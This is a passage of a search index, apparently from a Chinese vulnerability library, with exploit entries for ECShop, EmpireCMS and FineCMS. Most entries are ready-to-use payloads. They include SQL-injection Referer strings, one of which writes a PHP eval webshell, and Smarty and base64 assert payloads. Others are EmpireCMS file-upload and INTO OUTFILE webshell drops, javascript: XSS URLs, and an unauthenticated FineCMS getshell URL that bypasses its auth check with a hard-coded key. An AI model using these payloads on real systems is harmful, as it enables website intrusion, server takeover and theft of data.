\u7684\u8bbf\u95ee\u9700\u8981\u767b\u5f55\uff0c\u4f4d\u4e8eecshop/api/client/includes/lib_api.php\u7684API_UserLogin\u63a5\u53e3\u3002\u8fd9\u91cc\u767b\u5f55\u662f\u76f4\u63a5\u6821\u9a8c\u5bc6\u7801md5\uff0c\u4e5f\u5c31\u662f\u8bf4\u5f53\u601d\u8def\u4e00\u89e3\u4e0d\u51fa\u6765\u65f6\uff0c\u8fd9\u91cc\u4e5f\u80fd\u7528\u4e0a\u5bc6\u7801\u7684md5\u3002</p> <p>api\u767b\u5f55</p> <p>\u767b\u5f55\u6210\u529f\u540e\u8bbf\u95eeapi\u63a5\u53e3\uff0c\u53ef\u4ee5\u5229\u7528\u4e00\u4e2a\u4efb\u610f\u5199\u5165\u6f0f\u6d1e\u3002\u89e6\u53d1\u70b9\u4e3aupload_image\u51fd\u6570\uff0c\u5728API_AddBrand\u51fd\u6570\u4e2d\u88ab\u8c03\u7528\u3002</p> <p>upload_image\u51fd\u6570</p> <p>\u8c03\u7528upload_image\u51fd\u6570</p> <p>\u6700\u540e\u767b\u5f55\u6210\u529f\u540e\u5199\u5165\u6587\u4ef6\u7684payload\u4e3a\uff1a</p> <pre><code>URL: http://localhost/ecshop/api/client/api.php\n\nPOST: Json= {\"Action\":\"AddBrand\",\"brand_name\":\"test\",\"brand_logo\":{\"Data\":\"xx,\"Type\":\"xx\"}}\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ECShop4.1.0%E5%89%8D%E5%8F%B0%E5%85%8D%E7%99%BB%E5%BD%95SQL%E6%B3%A8%E5%85%A5/#getshell","title":"\u6700\u540egetshell","text":"<p>ecshop\u540e\u53f0\u80fd\u8bfb\u5199\u6587\u4ef6\u7684\u5730\u65b9\uff0c\u5927\u591a\u505a\u4e86\u9650\u5236\u3002\u73b0\u5728\u627e\u5230\u80fdshell\u7684\u5730\u65b9\uff0c\u5c31\u662f\u5728\u5229\u7528smarty\u6a21\u677f\u6e32\u67d3\u6765\u6267\u884c\u4ee3\u7801\uff0c\u53ef\u53c2\u8003ecshop\u539f\u6765\u7206\u8fc7\u7684\u4e00\u4e2a\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8fd9\u91cc\u7b80\u8981\u6982\u8ff0\u4e0b\u3002</p> <ol> <li>\u9996\u5148\u63d2\u5165\u4ee3\u7801\uff0c\u5728\u6a21\u677f\u7ba1\u7406\u91cc\u627e\u5230\u90ae\u4ef6\u6a21\u677f\uff0c\u4fee\u6539\u4e3a<code>{str:{\\$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJ3hjaGVjay5waHAnLCc8P3BocCBwaHBpbmZvKCk7Jyk7IA=='));//}x</code></li> </ol> <p>payload</p> <ol> <li>\u518d\u56de\u5230\u7ba1\u7406\u5bc6\u7801\u627e\u56de\u9875\u9762\uff0c\u70b9\u51fb\u786e\u5b9a\uff0c\u5373\u53ef\u89e6\u53d1\u3002</li> </ol> <p>\u89e6\u53d1\u9875\u9762</p> <p>\u5206\u6790\u5982\u4e0b\uff1a<code>$template['template_content']</code>\u4e3a\u6211\u4eec\u63d2\u5165\u7684\u6570\u636e\u3002</p> <p>\u89e6\u53d1\u5165\u53e3</p> <p>\u8ddf\u8fdbfetch\u51fd\u6570\uff0c\u8fdb\u5165eval\u51fd\u6570\u524d\u8fd8\u6709\u4e2afetch_str\u51fd\u6570\uff0c\u4f1a\u5bf9payload\u8fdb\u884c\u4e00\u4e9b\u8fc7\u6ee4\uff0c\u8fd9\u91cc\u4e0d\u5c55\u5f00\u7ec6\u8282\u3002</p> <p>fetch\u51fd\u6570</p> <p><code>_eval</code>\u51fd\u6570\u5c06\u8fc7\u6ee4\u540e\u7684\u5b57\u7b26\u4e32\u62ff\u8fc7\u6765\u8fdb\u884c\u6267\u884c\u3002\u7531\u4e8e\u662f\u65e0\u56de\u663e\uff0c\u6240\u4ee5payload\u91c7\u7528\u7684\u662f\u5199\u6587\u4ef6\u7684\u65b9\u5f0f\u3002</p> <p>eval\u6267\u884c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ECShop4.1.0%E5%89%8D%E5%8F%B0%E5%85%8D%E7%99%BB%E5%BD%95SQL%E6%B3%A8%E5%85%A5/#0x03","title":"0x03 \u7ed3\u675f\u8bed","text":"<p>\u8fd9\u4e2a\u524d\u53f0SQL\u6ce8\u5165\u8f83\u4e3a\u7b80\u5355\uff0c\u4f46\u662f\u5371\u5bb3\u8f83\u9ad8\uff0c\u53ea\u901a\u8fc7\u4e00\u4e9b\u7b80\u5355\u5b57\u7b26\u5339\u914d\u89c4\u5219\u53bb\u627e\u7c7b\u4f3c\u8fd9\u79cd\u6f0f\u6d1e\u7684\u8bdd\uff0c\u6574\u4e2a\u9879\u76ee\u5927\u6982\u6709\u4e09\u767e\u591a\u4e2a\uff0c\u5176\u4e2d\u524d\u53f0\u7684\u98ce\u9669\u5927\u591a\u88ab\u5355\u53cc\u5f15\u53f7\u5305\u88f9\u4e14\u5f00\u4e86GPC\u9632\u62a4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ECShop4.1.0%E5%89%8D%E5%8F%B0%E5%85%8D%E7%99%BB%E5%BD%95SQL%E6%B3%A8%E5%85%A5/#0x04","title":"0x04 \u53c2\u8003","text":"<p>Ecshop 2.x/3.x SQL\u6ce8\u5165/\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790\uff1ahttps://www.secrss.com/articles/4965</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_SQL%E6%B3%A8%E5%85%A5/","title":"ecshop2.x SQL\u6ce8\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_SQL%E6%B3%A8%E5%85%A5/#poc","title":"POC","text":"<p>Referer\u5904\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_SQL%E6%B3%A8%E5%85%A5/#_1","title":"\u6ce8\u5165","text":"<pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:72:\"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -\";s:2:\"id\";i:1;}\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"Ecshop2.x \u547d\u4ee4\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#affected-version","title":"Affected Version","text":"<p>ecshop2.x</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#poc","title":"POC","text":"<p>Referer\u5904\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_1","title":"\u4ee3\u7801\u6267\u884c","text":"<pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}\n</code></pre> <p>\u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u751f\u62101.php\u7684\u4e00\u53e5\u8bdd\u3002</p> <pre><code>assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp'));//}xxx\u0010\nfile_put_contents('1.php','&lt;?php eval($_POST[1337]); ?&gt;')\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/","title":"EmpireCMS V7.5\u540e\u53f0getshell\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>EmpireCMS &lt;= 7.5</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u9a8c\u8bc1","text":"<p>1.\u8fdb\u5165\u540e\u53f0\u5982\u4e0b\u754c\u9762\uff0c\u70b9\u51fb\u5bfc\u5165\u7cfb\u7edf\u6a21\u578b  2.\u6784\u9020\u6587\u4ef6a.mod,\u5185\u5bb9\u5982\u4e0b</p> <pre><code>&lt;?php file_put_contents(\"shell.php\",\"&lt;?php @eval(\\$_POST[cmd]);?&gt;\");?&gt;\n</code></pre> <p>3.\u4e0a\u4f20\u6587\u4ef6a.mod  4.\u67e5\u770b\u6587\u4ef6\u5df2\u7ecf\u6709shell.php\u4e86\uff0c\u83dc\u5200\u8fde\u63a5\u5373\u53ef </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/","title":"EmpireCMS V7.5\u540e\u53f0xss\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>EmpireCMS &lt;=7.5</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>\u9700\u8981\u6709\u540e\u53f0\u6743\u9650</p> <pre><code>http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/)\n</code></pre> <p>\u82e5\u63d0\u793a\u975e\u6cd5\u6765\u6e90\u52a0\u5165\u53c2\u6570hash\u53c2\u6570\uff0c\u4f8b\uff1aehash_gxCQz=zERR2KY6NAMicC0c5OYv,\u5982\u4e0b </p> <pre><code>http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/)&amp;ehash_gxCQz=zERR2KY6NAMicC50Yv\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"EmpireCMS V7.5\u540e\u53f0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>EmpireCMS V7.5</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u9a8c\u8bc1","text":"<p>\u9700\u8981\u6709\u540e\u53f0\u6743\u9650\u3002 1.\u767b\u5165\u540e\u53f0\u7ba1\u7406\u9875\u9762 2.\u70b9\u51fb\u7cfb\u7edf-&gt;\u5907\u4efd-&gt;\u5907\u4efd\u6570\u636e  3.\u968f\u4fbf\u9009\u62e9\u4e00\u4e2a\u8868\uff0c\u70b9\u51fb\u6700\u4e0b\u9762\u7684\u5f00\u59cb\u5907\u4efd\uff0c\u6293\u5305  4.\u6293\u5305\u540e\u4fee\u6539tablename\u5b57\u6bb5\u4e3a\u547d\u4ee4\u6267\u884c\u8bed\u53e5  5.\u8fd4\u56de\u9875\u9762  6.\u8bbf\u95ee\u5907\u4efd\u8def\u5f84\u4e0bconfig.php\u4ea6\u53ef  7.\u67e5\u770bconfig.php,\u547d\u4ee4\u5df2\u7ecf\u5199\u8fdb\u53bb\u4e86</p> <p></p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/","title":"EmpireCMS \u5168\u7248\u672cXSS\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6b66\u5668\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>EmpireCMS \u5168\u7248\u672c &lt;7.5</p>","tags":["\u767d\u9601-\u6b66\u5668\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<pre><code>http://*******/e/ViewImg/index.html?url=javascript:alert(/xss/)\n</code></pre>","tags":["\u767d\u9601-\u6b66\u5668\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS/","title":"EmpireCMS","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>EmpireCMS &lt;= V7.5</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS/#_2","title":"\u6f0f\u6d1e\u9a8c\u8bc1","text":"<p>\u7531\u4e8e\u540e\u7aef\u6ca1\u6709\u5bf9\u6267\u884c\u7684\u8bed\u53e5\u505a\u9650\u5236\u5bfc\u81f4\u53ef\u4ee5\u6267\u884c\u6076\u610fsql\u8bed\u53e5\u3002  POC\uff1a</p> <pre><code>select '&lt;?php @eval($_POST[1])?&gt;' into outfile 'D:/phpstudy_pro/WWW/shell.php'\n</code></pre> <p>\u6839\u636e\u5b9e\u9645\u8def\u5f84\u4fee\u6539\u8def\u5f84\u5373\u53ef\u3002 </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","title":"EmpireCMS\u5404\u7248\u672c\u6f0f\u6d1e\u73af\u5883\u642d\u5efa","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_1","title":"\u6d4b\u8bd5\u73af\u5883","text":"<p>Windows10 \u5bb6\u5ead\u7248</p> <p>phpstudy\u96c6\u6210Apache2.4.39 PHP5.6.9 MySql5.7.26</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_2","title":"\u6f0f\u6d1e\u73af\u5883\u642d\u5efa","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#1empirecms","title":"1.\u4e0b\u8f7dEmpireCMS\u5b89\u88c5\u5305\uff08\u6309\u7167\u6240\u9700\u7248\u672c\u4e0b\u8f7d\uff09","text":"<p>\u4e0b\u8f7d\u5730\u5740\uff1ahttp://www.phome.net/download/</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#2-upload","title":"2.\u5c06 \u5b89\u88c5\u5305upload\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u653e\u5165\u7f51\u7ad9\u6839\u76ee\u5f55","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#3","title":"3.\u6d4f\u89c8\u5668\u8bbf\u95ee\u5b89\u88c5\u811a\u672c","text":"<p>\u5730\u5740\uff1ahttp://127.0.0.1/e/install/index.php</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#4","title":"4.\u63a5\u4e0b\u6765\u6309\u7167\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u5b89\u88c5\u5373\u53ef","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/FineCMS_v5.0.8%E4%B8%A4%E5%A4%84getshell/","title":"FineCMS v5.0.8\u4e24\u5904getshell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/FineCMS_v5.0.8%E4%B8%A4%E5%A4%84getshell/#0x01","title":"0x01 \u524d\u8a00","text":"<p>\u5c31\u8981\u88ab**\uff0c\u7f8e\u5176\u540d\u66f0\uff1a\u6bd4\u6211\u7684web\u5b89\u5168\u7814\u7a76\u548c\u4ee3\u7801\u5ba1\u8ba1\u66f4\u6709\u524d\u9014\u3002\u5f53\u7136\u662f\u9009\u62e9\u539f\u8c05\u4ed6\u5566\u3002 \u5148\u5ba1\u8ba1finecms\u53bb\u53bb\u706b\uff0c\u627e\u5230\u516d\u5904\u6f0f\u6d1e\uff0c\u5148\u653e\u4e24\u5904\u5bb9\u6613\u88ab\u53d1\u73b0\u7684getshell\u548c\u5bf9\u5e94\u7684\u4e24\u4e2apython\u811a\u672c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/FineCMS_v5.0.8%E4%B8%A4%E5%A4%84getshell/#0x02-getshell","title":"0x02 getshell","text":"<p>\u7b2c\u4e00\u5904getshell\uff1a\u5728C:/phpStudy/WWW/finecms/dayrui/controllers/Api.php\u4e2d\u7684data2\u51fd\u6570\uff0c\u5927\u7ea6\u5728\u7b2c115\u884c\uff0c\u6709\u95ee\u9898\u7684\u4ee3\u7801\u5927\u7ea6\u5728178\u884c</p> <pre><code>public function data2() {\n\n    $data = array();\n\n    // \u5b89\u5168\u7801\u8ba4\u8bc1\n    $auth = $this-&gt;input-&gt;get('auth', true);\n    if ($auth != md5(SYS_KEY)) {\n        // \u6388\u6743\u8ba4\u8bc1\u7801\u4e0d\u6b63\u786e\n        $data = array('msg' =&gt; '\u6388\u6743\u8ba4\u8bc1\u7801\u4e0d\u6b63\u786e', 'code' =&gt; 0);\n    } else {\n        // \u89e3\u6790\u6570\u636e\n        $cache = '';\n        $param = $this-&gt;input-&gt;get('param');\n        if (isset($param['cache']) &amp;&amp; $param['cache']) {\n            $cache = md5(dr_array2string($param));\n            $data = $this-&gt;get_cache_data($cache);\n        }\n        if (!$data) {\n\n            if ($param == 'login') {\n                // \u767b\u5f55\u8ba4\u8bc1\n                $code = $this-&gt;member_model-&gt;login(\n                    $this-&gt;input-&gt;get('username'),\n                    $this-&gt;input-&gt;get('password'),\n                    0, 1);\n                if (is_array($code)) {\n                    $data = array(\n                        'msg' =&gt; 'ok',\n                        'code' =&gt; 1,\n                        'return' =&gt; $this-&gt;member_model-&gt;get_member($code['uid'])\n                    );\n                } elseif ($code == -1) {\n                    $data = array('msg' =&gt; fc_lang('\u4f1a\u5458\u4e0d\u5b58\u5728'), 'code' =&gt; 0);\n                } elseif ($code == -2) {\n                    $data = array('msg' =&gt; fc_lang('\u5bc6\u7801\u4e0d\u6b63\u786e'), 'code' =&gt; 0);\n                } elseif ($code == -3) {\n                    $data = array('msg' =&gt; fc_lang('Ucenter\u6ce8\u518c\u5931\u8d25'), 'code' =&gt; 0);\n                } elseif ($code == -4) {\n                    $data = array('msg' =&gt; fc_lang('Ucenter\uff1a\u4f1a\u5458\u540d\u79f0\u4e0d\u5408\u6cd5'), 'code' =&gt; 0);\n                }\n            } elseif ($param == 'update_avatar') {\n                // \u66f4\u65b0\u5934\u50cf\n                $uid = (int)$_REQUEST['uid'];\n                $file = $_REQUEST['file'];\n                //\n                // \u521b\u5efa\u56fe\u7247\u5b58\u50a8\u6587\u4ef6\u5939\n                $dir = SYS_UPLOAD_PATH.'/member/'.$uid.'/';\n                @dr_dir_delete($dir);\n                if (!is_dir($dir)) {\n                    dr_mkdirs($dir);\n                }\n                $file = str_replace(' ', '+', $file);\n                if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)){\n                    $new_file = $dir.'0x0.'.$result[2];\n                    if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {\n                        $data = array(\n                            'msg' =&gt; '\u76ee\u5f55\u6743\u9650\u4e0d\u8db3\u6216\u78c1\u76d8\u5df2\u6ee1',\n                            'code' =&gt; 0\n                        );\n                    }\n</code></pre> <p>\u5176\u4e2d\uff0c\u9996\u5148</p> <pre><code>$file = $_REQUEST['file'];\n</code></pre> <p>\u83b7\u53d6$file\u53d8\u91cf</p> <pre><code>if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)){\n                        $new_file = $dir.'0x0.'.$result[2];\n                        if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {\n                            $data = array(\n                                'msg' =&gt; '\u76ee\u5f55\u6743\u9650\u4e0d\u8db3\u6216\u78c1\u76d8\u5df2\u6ee1',\n                                'code' =&gt; 0\n                            );\n</code></pre> <p>\u7136\u540e\u7528preg_match\u51fd\u6570\u8fdb\u884c\u6b63\u5219\u5339\u914d\uff0c\u56e0\u4e3a\\(file\u53d8\u91cf\u53ef\u63a7\uff0c\u6240\u4ee5\\)result\u4e5f\u662f\u53ef\u63a7\u7684\uff0c\u4ece\u800c$new_file\u4e5f\u662f\u53ef\u63a7\u7684\uff0c\u53ef\u4ee5\u6784\u9020\u4e3aphp\u6587\u4ef6\uff0c\u7136\u540e</p> <pre><code>file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file))))\n</code></pre> <p>\u5bf9\\(result[1]\u8fdb\u884cbase64\u89e3\u7801\uff0c\u7136\u540e\u5199\u5165\\)new_file\u6587\u4ef6\u4e2d\u3002\u663e\u7136\uff0c\u662f\u53ef\u4ee5\u4efb\u610f\u5199\u6587\u4ef6\u8fdb\u884cgetshell\u7684\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u8981\u8ba9\u7a0b\u5e8f\u80fd\u591f\u8fd0\u884c\u5230\u8fd9\u4e9b\u4ee3\u7801\uff0c\u4e0d\u80fd\u5728\u4e4b\u524d\u5c31\u9000\u51fa\u4e86\u3002\u8981\u7ecf\u8fc7</p> <pre><code> $auth = $this-&gt;input-&gt;get('auth');\n if ($auth != md5(SYS_KEY))\n</code></pre> <p>SYS_KEY\u88ab\u7cfb\u7edf\u786c\u7f16\u7801\u4e3a24b16fede9a67c9251d3e7c7161c83ac\uff0c\u5728C:phpStudyWWWconfigsystem.php\u4e2d\u6709\u5b9a\u4e49\u3002\u76f4\u63a5md5\u52a0\u5bc6\u4e00\u6b21\u5373\u53ef\u7ed5\u8fc7</p> <p>\u6240\u4ee5\u6700\u7ec8\u7684payload\u4e3a</p> <pre><code>http://localhost:88/index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=update_avatar&amp;file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+\n</code></pre> <p>\u65e0\u9700\u767b\u5f55\uff0c\u76f4\u63a5getshell,\u8def\u5f84\u4e3ahttp://localhost:88/uploadfile/member/0/0x0.php </p> <p>\u7b2c\u4e8c\u5904getshell\uff1a\u5728\u6587\u4ef6C:/phpStudy/WWW/finecms/dayrui/controllers/member/Account.php\u4e2d\u7684upload\u51fd\u6570</p> <pre><code>if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)){\n                $new_file = $dir.'0x0.'.$result[2];\n                if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {\n                    exit(dr_json(0, '\u76ee\u5f55\u6743\u9650\u4e0d\u8db3\u6216\u78c1\u76d8\u5df2\u6ee1'));\n</code></pre> <p>\u6ce8\u518c\u4f1a\u5458\uff0c\u767b\u5f55</p> <pre><code>\u8bbf\u95ee\uff1ahttp://localhost:88/index.php?s=member&amp;c=account&amp;m=upload\nPOST\uff1atx=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+\n</code></pre> <p></p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/FineCMS_v5.0.8%E4%B8%A4%E5%A4%84getshell/#0x03-pythonpoc","title":"0x03 